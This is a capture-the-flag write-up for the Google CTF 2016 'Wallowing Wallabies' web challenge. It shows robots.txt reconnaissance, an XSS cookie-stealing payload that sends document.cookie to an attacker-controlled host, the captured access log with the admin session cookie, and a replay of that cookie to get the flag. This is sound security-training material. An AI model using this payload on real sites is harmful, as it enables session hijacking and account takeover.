### Solved by rasta_mouse

Wallowing Wallabies - Part One is a 25 point Web challenge.

We can get a list of interesting URLs from `https://wallowing-wallabies.ctfcompetition.com/robots.txt`

```
User-agent: *
Disallow: /deep-blue-sea/
Disallow: /deep-blue-sea/team/
# Yes, these are alphabet puns :)
Disallow: /deep-blue-sea/team/characters
Disallow: /deep-blue-sea/team/paragraphs
Disallow: /deep-blue-sea/team/lines
Disallow: /deep-blue-sea/team/runes
Disallow: /deep-blue-sea/team/vendors
```

`/deep-blue-sea/team/vendors` has a page where we can submit a message, which is vulnerable to XSS.

![](/images/2016/google-ctf/wallowing-wallabies-part1/message.png)

If we submit a test message, the challenge gives us a clue about what we have to do:

```
Thank you, your request has been received
Your message to the admins is as follows:
!!! Expecting to find '<script src=' in your input -- please re-read the level challenge.
```

I used a fairly standard XSS vector to steal the admin's cookie:

```
<script src=x onerror=document.location='http://<redacted>?cookie='+document.cookie>
```

We then receive the following in the Apache access logs:

```
"GET /?cookie=green-mountains=eyJub25jZSI6IjkyNzQzYzg4MTllYTU1NzYiLCJhbGxvd2VkIjoiXi9kZWVwLWJsdWUtc2VhL3RlYW0vdmVuZG9ycy4qJCIsImV4cGlyeSI6MTQ2MjA0MzIyMX0=|1462043218|268ff31ba2799187278b167e1835ad653bef1f0b HTTP/1.1" 200 3417 "http://ctf-wallowing-wallabies.appspot.com/under-the-sea/application/31337" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36"
```

We can then take this cookie and use it to request `/deep-blue-sea/team/vendors` again.  This time, we're given the flag:

```
CTF{feeling_robbed_of_your_cookies}
```